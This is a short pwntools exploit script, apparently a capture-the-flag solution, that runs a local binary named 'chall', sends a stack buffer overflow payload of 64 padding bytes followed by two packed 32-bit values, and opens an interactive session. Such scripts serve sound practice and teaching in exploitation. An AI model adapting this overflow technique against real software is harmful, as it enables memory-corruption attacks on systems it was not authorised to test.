from pwn import *

p = process("./chall")

payload = b"A" * 64 + p32(0xdeadbeef) + p32(0x13371337)

p.sendline(payload)
p.interactive()